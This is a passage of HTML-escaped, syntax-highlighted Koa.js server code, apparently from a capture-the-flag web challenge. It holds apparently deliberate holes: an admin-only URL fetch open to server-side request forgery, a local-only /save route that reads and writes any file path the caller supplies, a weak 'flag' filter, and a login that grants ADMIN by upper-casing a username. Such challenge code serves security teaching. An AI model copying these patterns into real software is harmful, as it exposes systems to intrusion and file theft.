style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/&amp;lt;/g&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;amp;lt;&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/&amp;gt;/g&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;missing parameter:param&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/request&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;ADMIN&amp;#39;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">decodeURI&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">checkUrl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;errorurl&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;error url&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;è¯·æ±‚çš„url:&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#00a8c8">typeof&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;:&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">resolve&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">req&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setEncoding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">statusCode&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">error&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;è¯·æ±‚å¤±è´¥\n&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;span style="color:#d88200">`çŠ¶æ€ç : &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">statusCode&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">resume&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;end&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">out&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">WriteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;Requst results in :&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;tmp&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;403: You have not the permission&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/save&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;::ffff:&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#75af00">server_ip&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;403: You are not the local user&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">switch&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">reqbody&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">qs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">querystring&lt;/span>&lt;span style="color:#111">,{&lt;/span>&lt;span style="color:#75af00">allowPrototypes&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">switch&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">spath&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#75af00">paths&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readdirSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">buffer&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">tmp&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;opath&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/[flag]/&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">tmp&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;opath&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#75af00">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">tmp&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;opath&amp;#39;&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/f|l|a|g/g&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">opath&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">paths&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#75af00">paths&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">buffer&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">text&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFileSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">WriteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">spath&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">text&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/delete&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;ADMIN&amp;#39;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;/results.txt&amp;#39;&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#75af00">DeleteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;Delete the results Successfully!&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;Nothing to delete!&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userName&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">checkUser&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userName&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toUpperCase&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">})&lt;/span>
